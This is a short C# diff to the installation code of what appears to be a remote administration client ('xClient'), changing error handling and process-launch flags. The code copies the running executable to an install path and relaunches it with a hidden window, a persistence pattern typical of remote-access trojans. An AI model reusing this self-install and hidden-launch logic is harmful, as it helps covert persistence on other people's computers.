@@ -24,7 +24,6 @@ namespace xClient.Core.Installation
                 }
                 catch (Exception)
                 {
-                    ClientData.Disconnect = true;
                     return;
                 }
             }
@@ -61,9 +60,8 @@ namespace xClient.Core.Installation
             {
                 File.Copy(ClientData.CurrentPath, ClientData.InstallPath, true);
             }
-            catch
+            catch (Exception)
             {
-                ClientData.Disconnect = true;
                 return;
             }
 
@@ -91,7 +89,7 @@ namespace xClient.Core.Installation
             {
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
-                UseShellExecute = true,
+                UseShellExecute = false,
                 FileName = ClientData.InstallPath
             };
             try
@@ -100,10 +98,7 @@ namespace xClient.Core.Installation
             }
             catch (Exception)
             {
-                ClientData.Disconnect = true;
-                return;
             }
-            ClientData.Disconnect = true;
         }
     }
 }
